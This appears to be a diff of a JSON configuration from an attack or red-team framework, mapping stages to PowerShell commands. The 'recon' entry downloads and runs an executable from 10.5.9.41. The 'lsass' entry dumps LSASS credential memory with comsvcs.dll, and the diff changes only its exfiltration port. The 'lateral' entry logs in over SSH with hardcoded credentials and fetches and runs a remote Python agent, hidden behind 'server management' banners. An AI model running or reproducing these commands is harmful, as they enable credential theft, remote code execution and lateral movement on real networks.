@@ -1,7 +1,7 @@
 {
   "recon": "New-Item -ItemType Directory -Path \"C:\\temp\\assessment\" -Force; Set-Location \"C:\\temp\\assessment\"; Invoke-WebRequest -Uri \"http://10.5.9.41:5001/downloads/network_admin.exe\" -OutFile \"network_admin.exe\" -UserAgent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"; Start-Process -FilePath \".\\network_admin.exe\" -Wait; Remove-Item \"network_admin.exe\" -Force",
   
-  "lsass": "$processId = (Get-Process lsass).Id; $dumpFile = \"C:\\temp\\lsass_exfil.dmp\"; $targetIP = \"10.5.9.41\"; $targetURL = \"http://$targetIP:8000\"; New-Item -ItemType Directory -Path \"C:\\temp\" -Force; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $processId $dumpFile full; Remove-Item $dumpFile -Force",
+  "lsass": "$processId = (Get-Process lsass).Id; $dumpFile = \"C:\\temp\\lsass_exfil.dmp\"; $targetIP = \"10.5.9.41\"; $targetURL = \"http://$targetIP:5001\"; New-Item -ItemType Directory -Path \"C:\\temp\" -Force; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $processId $dumpFile full; Remove-Item $dumpFile -Force",
   
   "lateral": "Write-Host \"=== AUTOMATED SERVER MANAGEMENT DEPLOYMENT ===\"\\n\\nInstall-Module -Name Posh-SSH -Force -AllowClobber; Import-Module Posh-SSH; $session = New-SSHSession -ComputerName \"10.5.9.40\" -Credential (New-Object System.Management.Automation.PSCredential(\"samba\", (ConvertTo-SecureString \"password123\" -AsPlainText -Force))) -AcceptKey; Invoke-SSHCommand -SessionId $session.SessionId -Command \"wget -O /home/samba/agent.py http://10.5.9.41:5001/downloads/advanced_agent.py && python3 /home/samba/agent.py --server http://10.5.9.41:5001 &\"; Remove-SSHSession -SessionId $session.SessionId\\n\\nWrite-Host \"=== SERVER MANAGEMENT DEPLOYMENT COMPLETED ===\"",
   
